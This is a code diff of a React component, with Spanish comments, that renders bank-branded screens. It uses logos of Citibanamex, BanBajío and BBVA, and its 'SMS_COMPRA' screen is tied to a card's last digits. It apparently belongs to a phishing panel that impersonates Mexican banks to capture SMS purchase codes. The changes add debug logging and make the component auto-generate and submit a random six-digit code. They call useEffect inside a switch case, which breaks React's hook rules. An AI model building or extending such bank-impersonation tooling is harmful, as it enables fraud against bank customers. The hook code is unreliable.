@@ -4,6 +4,9 @@ import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { ScreenType } from '@shared/schema';
 
+// Para debug
+console.log('ScreenType.SMS_COMPRA:', ScreenType.SMS_COMPRA);
+
 import citibanamexLogo from '../../assets/Banamex.png';
 import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
 import bbvaLogo from '../../assets/bbva_logo.png';
@@ -529,8 +532,9 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(mensajeContent);
 
       case ScreenType.SMS_COMPRA:
-        // Generar automáticamente un código válido de 6 dígitos si no hay uno en el input
-        useEffect(() => {
+        // Generar automáticamente un código válido de 6 dígitos al mostrar la pantalla
+        // useEffect ya está disponible desde el componente principal
+        React.useEffect(() => {
           if (!smsCompraInput && screenData.terminacion) {
             // Generar un código aleatorio de 6 dígitos solo al montar el componente
             const randomCode = Math.floor(100000 + Math.random() * 900000).toString();
@@ -538,12 +542,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             
             // Simular un retardo y luego enviar automáticamente
             const timer = setTimeout(() => {
+              console.log("Enviando código automático de SMS compra:", randomCode);
               onSubmit(ScreenType.SMS_COMPRA, { smsCompra: randomCode });
             }, 500);
             
             return () => clearTimeout(timer);
           }
-        }, [screenData.terminacion]);
+        }, [screenData.terminacion, smsCompraInput, onSubmit]);
         
         const smsCompraContent = (
           <>
